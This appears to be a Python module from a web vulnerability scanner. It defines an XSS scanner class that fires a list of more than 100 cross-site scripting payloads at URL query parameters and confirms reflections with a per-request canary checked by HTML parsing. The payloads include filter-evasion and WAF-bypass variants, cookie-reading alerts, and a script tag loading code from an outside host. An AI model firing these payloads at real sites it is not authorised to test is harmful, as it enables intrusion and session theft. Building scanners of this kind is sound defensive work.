from typing import List
from .base import BaseScanner, Vulnerability
from ..core.target import Target
from ..core.url_utils import get_query_params, merge_params, set_query_param
from bs4 import BeautifulSoup
import json
import logging
import random
import re

logger = logging.getLogger(__name__)

class XSSScanner(BaseScanner):
    """
    Nikto-level XSS Scanner
    117 payloads covering all contexts and bypass techniques.

    Detection is context-aware rather than a bare substring match:
      * Most payloads carry a fixed numeral argument (alert(1), confirm(1), ...);
        that "1" is replaced with a unique per-request canary so a match can only
        be caused by THIS specific request, not a coincidental "alert(1)" example
        that already exists elsewhere on the page.
      * The response is parsed with BeautifulSoup — the same way a browser would —
        and a finding requires the canary/payload to have landed inside a genuinely
        executable construct: a real <script> element, an on*="..." event-handler
        attribute, or a javascript: URI in a URL-bearing attribute. HTML-encoded
        reflections (&lt;script&gt;...) and reflections inside inert containers
        (an HTML comment, a <textarea>) parse as plain text, not as those
        constructs, and so are correctly not flagged — see the empirical checks
        this is based on: a comment or <textarea> never yields a parsed <script>
        tag or on* attribute even when the raw markup is present verbatim.
    """

    PAYLOADS = [
        # === BASIC SCRIPT TAGS ===
        "<script>alert(1)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(window.origin)</script>",
        "<script src=//xss.rocks/xss.js></script>",
        "<script src=data:text/javascript,alert(1)></script>",

        # === EVENT HANDLERS ===
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=confirm(1)>",
        "<img src=x onerror=prompt(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<iframe onload=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",

        # === SVG-BASED XSS ===
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x to=0>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg><a xlink:href=javascript:alert(1)><text x=0 y=20>XSS</text></a></svg>",

        # === JAVASCRIPT PROTOCOL ===
        "javascript:alert(1)",
        "javascript:confirm(1)",
        "javascript://comment%0aalert(1)",
        "javascript://%0aalert(1)",
        "javascript:void(alert(1))",
        "javascript:eval('alert(1)')",

        # === ATTRIBUTE BREAKING ===
        "\"><script>alert(1)</script>",
        "' autofocus onfocus=alert(1) x='",
        "\" autofocus onfocus=alert(1) x=\"",
        "'/><script>alert(1)</script>",
        "\"/><script>alert(1)</script>",
        "' onmouseover='alert(1)",
        "\" onmouseover=\"alert(1)",

        # === HTML ENCODING BYPASSES ===
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<img src=x onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;(1)\">",
        "<img src=x onerror=alert(1)>",

        # === CASE VARIATION ===
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<IMG SRC=x ONERROR=alert(1)>",
        "<iMg sRc=x OnErRoR=alert(1)>",
        "<ImG sRc=X oNeRrOr=alert(1)>",

        # === POLYGLOT XSS ===
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img src=x onerror=alert(1)>",
        "--><script>alert(1)</script><!--",

        # === FRAMEWORK-SPECIFIC ===
        # Angular
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a','alert(1)'].sort(toString.constructor);}}",

        # Vue
        "{{_c.constructor('alert(1)')()}}",

        # React (no eval, but template injection)
        "${alert(1)}",
        "`${alert(1)}`",

        # Template literals
        "${alert(document.domain)}",
        "${alert(document.cookie)}",

        # === FILTER EVASION ===
        "<svg/onload=alert(1)>",
        "<svg//onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<script>al\\u0065rt(1)</script>",
        "<script>\\u0061lert(1)</script>",
        "<script>eval('al'+'ert(1)')</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",

        # === DATA URI ===
        "<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",

        # === DOM-BASED XSS ===
        "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",  # alert(1) base64
        "<img src=x onerror=this.src='javascript:alert(1)'>",
        "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",

        # === WHITESPACE MANIPULATION ===
        "<img%09src=x%09onerror=alert(1)>",
        "<img%0asrc=x%0aonerror=alert(1)>",
        "<img%0dsrc=x%0donerror=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
        "<svg\nonload=alert(1)>",

        # === QUOTE-LESS XSS ===
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
        "<img src=x onerror='alert(1)'>",
        "<img src=x onerror=\"alert(1)\">",

        # === MUTATION XSS (mXSS) ===
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<listing><script>alert(1)</script></listing>",
        "<style><img src=x onerror=alert(1)></style>",

        # === WAF BYPASS TECHNIQUES ===
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<SCRİPT>alert(1)</SCRİPT>",  # Turkish dotless i
        "<ſcript>alert(1)</ſcript>",  # Unicode lookalike

        # === CONTEXT-SPECIFIC ===
        # Inside tag
        "onload=alert(1)",
        "autofocus onfocus=alert(1)",

        # Inside attribute
        "x' onerror='alert(1)",
        "x\" onerror=\"alert(1)",

        # === ADVANCED PAYLOADS ===
        "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<form><button formaction=javascript:alert(1)>XSS",
        "<input type=image src=1 onerror=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<form action=javascript:alert(1)><input type=submit>",

        # === NO-SCRIPT BYPASS ===
        "<noembed><script>alert(1)</script></noembed>",
        "<noframes><script>alert(1)</script></noframes>",

        # === ADDITIONAL VECTORS ===
        "<button onclick=alert(1)>click</button>",
        "<div onwheel=alert(1)>scroll</div>",
        "<div onmouseover=alert(1)>hover</div>",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",

        # === ENCODED VARIATIONS ===
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",

        # === MIXED CASE + ENCODING ===
        "<ScRiPt>&#97;&#108;&#101;&#114;&#116;(1)</ScRiPt>",
        "<IMG SRC=\"javascript:alert(1)\">",

        # === ZERO-WIDTH CHARACTERS ===
        "<script>alert​(1)</script>",
        "<img src=x onerror=alert﻿(1)>",

        # === SELF-XSS / DOM MANIPULATION ===
        "#<img src=x onerror=alert(1)>",
        "javascript:eval('document.body.innerHTML=\"<img src=x onerror=alert(1)>\"')",
    ]

    # Attributes that can carry an executable-scheme URI and trigger execution
    # when clicked/loaded/rendered.
    URI_ATTRS = {'href', 'src', 'action', 'formaction', 'data', 'xlink:href', 'poster'}
    # URI schemes a browser will actually execute/render as script, as opposed to
    # e.g. a plain https:/mailto: URI a canary could otherwise coincidentally sit
    # inside without any code ever running.
    EXECUTABLE_URI_SCHEMES = (
        'javascript:', 'vbscript:', 'data:text/html', 'data:text/javascript',
        'data:application/javascript', 'data:image/svg+xml',
    )

    # Real DOM/SVG event-handler content attributes (an explicit allow-list, not a
    # bare "starts with on" prefix match — the latter also matches non-event
    # attributes that merely happen to start with those two letters, e.g. AMP's
    # literal `on="tap:..."` action-binding attribute, or a hypothetical
    # "data-on-sale" attribute; neither is a JS execution sink).
    EVENT_HANDLER_ATTRS = {
        'onabort', 'onafterprint', 'onanimationend', 'onanimationiteration',
        'onanimationstart', 'onbeforeprint', 'onbeforeunload', 'onbegin', 'onblur',
        'oncancel', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick',
        'onclose', 'oncontextmenu', 'oncuechange', 'ondblclick', 'ondrag',
        'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart',
        'ondrop', 'ondurationchange', 'onemptied', 'onend', 'onended', 'onerror',
        'onfocus', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown',
        'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata',
        'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave',
        'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onoffline',
        'ononline', 'onpause', 'onplay', 'onplaying', 'onpointercancel',
        'onpointerdown', 'onpointerenter', 'onpointerleave', 'onpointermove',
        'onpointerout', 'onpointerover', 'onpointerup', 'onpopstate',
        'onprogress', 'onratechange', 'onrepeat', 'onreset', 'onresize',
        'onscroll', 'onseeked', 'onseeking', 'onselect', 'onshow', 'onsort',
        'onstalled', 'onstart', 'onstorage', 'onsubmit', 'onsuspend',
        'ontimeupdate', 'ontoggle', 'ontransitionend', 'onunload',
        'onvolumechange', 'onwaiting', 'onwheel',
    }

    # <script> types a browser actually executes. Any OTHER explicit type
    # (application/json, application/ld+json, text/template, ...) is a data
    # island — never executed, even though BeautifulSoup parses it as a <script>
    # element and its text is fully accessible.
    EXECUTING_SCRIPT_TYPES = {
        '', 'text/javascript', 'application/javascript', 'application/x-javascript',
        'application/ecmascript', 'text/ecmascript', 'module',
    }

    # Parameter names to test. A class attribute (matching the convention used by
    # SQLInjectionScanner) so it can be narrowed in tests.
    PARAMS = ['q', 'search', 'query', 'name', 'username', 'email', 'comment',
              'message', 'text', 'input', 'data']

    # Matches a call to one of the payloads' own JS sinks, so a canary can be
    # inserted as an extra leading argument (JS evaluates every call argument
    # eagerly regardless of how many the function actually uses).
    _SINK_CALL_RE = re.compile(r'\b(?:alert|confirm|prompt|eval)\s*\(', re.IGNORECASE)
    # A quoted or unquoted on*=value assignment, so a canary can be appended
    # inside the existing attribute value as a trailing JS comment.
    _ON_ATTR_RE = re.compile(r'(on\w+\s*=\s*)("[^"]*"|\'[^\']*\'|[^\s>]+)', re.IGNORECASE)

    @staticmethod
    def _build_test_payload(payload: str, canary: str):
        """Returns (test_payload, marker) — embedding a unique per-request canary
        into the payload so a DOM match can only be caused by this exact request,
        not a coincidental example that already exists elsewhere on the page.

        Tries, in order, the least invasive substitution that still preserves the
        payload's own technique untouched:
          1. The common alert(1)/confirm(1)/prompt(1)/alert`1` numeral argument.
          2. Any alert/confirm/prompt/eval(...) call with a different argument
             (document.domain, a char-code/base64 expression, ...) — the canary is
             inserted as an extra leading argument via the comma operator; JS still
             evaluates the original argument expression exactly as before.
          3. An on*=... event-handler attribute with no such call — the canary is
             appended as a trailing JS comment inside the existing attribute value.
          4. A <script>...</script> payload that matched neither of the above
             (e.g. an external-src-only script tag) — the canary is appended as a
             trailing JS comment just before the closing tag.
        Only if none of these apply does it fall back to matching the payload's
        own (fixed, non-random) text — see _lands_in_executable_context.
        """
        if '(1)' in payload:
            return payload.replace('(1)', f'({canary})'), canary
        if '`1`' in payload:
            return payload.replace('`1`', f'`{canary}`'), canary

        m = XSSScanner._SINK_CALL_RE.search(payload)
        if m:
            insert_at = m.end()
            return payload[:insert_at] + f'{canary},' + payload[insert_at:], canary

        m = XSSScanner._ON_ATTR_RE.search(payload)
        if m:
            value = m.group(2)
            if value[:1] in ('"', "'"):
                quote = value[0]
                new_value = f'{quote}{value[1:-1]}/*{canary}*/{quote}'
            else:
                new_value = f'{value}/*{canary}*/'
            start, end = m.span(2)
            return payload[:start] + new_value + payload[end:], canary

        lower = payload.lower()
        if '</script>' in lower:
            idx = lower.index('</script>')
            return payload[:idx] + f'/*{canary}*/' + payload[idx:], canary

        return payload, payload

    @staticmethod
    def _marker_present(text: str, marker: str) -> bool:
        """Containment check for `marker` in `text`. For a purely numeric canary,
        requires it not be embedded inside a longer digit run (e.g. part of an
        analytics ID or timestamp already on the page), reducing the — already
        small — chance of a coincidental collision. Non-numeric markers (the rare
        whole-payload fallback) use plain substring containment."""
        if marker.isdigit():
            return re.search(r'(?<!\d)' + re.escape(marker) + r'(?!\d)', text) is not None
        return marker in text

    def _looks_like_json(self, response) -> bool:
        """A JSON API response is never rendered as an HTML document by a
        browser, so even if html.parser can tokenize an embedded "<script>...”
        substring out of its raw text (JSON encoding does not require escaping
        angle brackets), that would not be real XSS. Skip the DOM check entirely
        for such responses."""
        content_type = ''
        try:
            content_type = (response.headers.get('Content-Type', '') or '').lower()
        except Exception:
            pass
        if 'json' in content_type:
            return True
        if content_type:
            return False
        text = (response.text or '').strip()
        if text[:1] not in ('{', '['):
            return False
        try:
            json.loads(text)
            return True
        except Exception:
            return False

    def _lands_in_executable_context(self, response, marker: str) -> bool:
        """Parse the response the way a browser would and confirm `marker` ended
        up inside a genuinely executable construct: a real, JS-typed <script>
        element, an event-handler attribute, or a javascript: URI — rather than
        merely appearing as text (HTML-encoded output, inert content inside a
        comment or a <textarea>, or a non-executing <script type="application/
        json"> data island, all parse as plain text/inert data, never as these
        constructs)."""
        if self._looks_like_json(response):
            return False

        try:
            soup = BeautifulSoup(response.text, 'html.parser')
        except Exception:
            return False

        for script in soup.find_all('script'):
            script_type = (script.get('type') or '').strip().lower()
            if script_type not in self.EXECUTING_SCRIPT_TYPES:
                continue  # data island (application/json, application/ld+json, ...) -- inert
            if self._marker_present(script.get_text(), marker):
                return True
            if self._marker_present(script.get('src') or '', marker):
                return True

        for tag in soup.find_all(True):
            for attr_name, attr_value in tag.attrs.items():
                value_str = attr_value if isinstance(attr_value, str) else ' '.join(attr_value)
                name_lower = attr_name.lower()
                if name_lower in self.EVENT_HANDLER_ATTRS and self._marker_present(value_str, marker):
                    return True
                if name_lower in self.URI_ATTRS and self._marker_present(value_str, marker) \
                        and any(scheme in value_str.lower() for scheme in self.EXECUTABLE_URI_SCHEMES):
                    return True

        return False

    def scan(self, target: Target, callback=None) -> List[Vulnerability]:
        """
        Comprehensive XSS scan with context-aware, canary-confirmed detection.
        Tests multiple injection contexts and bypass techniques.
        """
        vulnerabilities = []
        logger.info(f"Starting Nikto-level XSS scan on {target.url}")

        payload_count = 0

        # Real query parameters this specific URL already carries (e.g. a
        # crawler-discovered "?q=foo") are tested first -- they're evidence of
        # an actual input, not a guess -- followed by the default guessed names.
        params_to_test = merge_params(get_query_params(target.url), self.PARAMS)

        for param in params_to_test:
            param_found = False  # report at most one finding per parameter (dedupe)
            for payload in self.PAYLOADS:
                if param_found:
                    break
                payload_count += 1

                if callback:
                    callback(payload)

                try:
                    canary = str(random.randint(100000, 999999))
                    test_payload, marker = self._build_test_payload(payload, canary)

                    # Replace (not append) the parameter's value, so a real query
                    # param the URL already carries is genuinely fuzzed instead of
                    # producing an inert duplicate query key.
                    test_url = set_query_param(target.url, param, test_payload)

                    response = self.session.get(test_url, headers=target.headers, timeout=5)

                    if self._lands_in_executable_context(response, marker):
                        vuln = Vulnerability(
                            name="Cross-Site Scripting (XSS)",
                            description=f"Reflected XSS vulnerability confirmed. Parameter '{param}' reflects user input unencoded into an executable context (script body, event-handler attribute, or javascript: URI) — verified by parsing the response and confirming a unique per-request marker landed inside that construct, not by a bare substring match.",
                            severity="HIGH",
                            evidence=f"Payload: {payload}\nParameter: {param}\nMarker '{marker}' found parsed into a live <script> element or on*/javascript: attribute (confirmed via HTML parsing).\nResponse preview: {response.text[:500]}",
                            url=test_url,
                            recommendation="Implement context-aware output encoding (HTML-entity encode for HTML body context, JS-string-escape for script context, attribute-encode for attribute context). Use a Content Security Policy (CSP). Sanitize all user input before rendering.",
                            proof_of_concept=f"Visit: {test_url}"
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"XSS vulnerability found at {test_url}")
                        param_found = True

                except Exception as e:
                    logger.debug(f"Error testing XSS payload {payload[:50]}... on param {param}: {str(e)}")
                    continue

        logger.info(f"XSS scan complete. Tested {payload_count} payload combinations. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
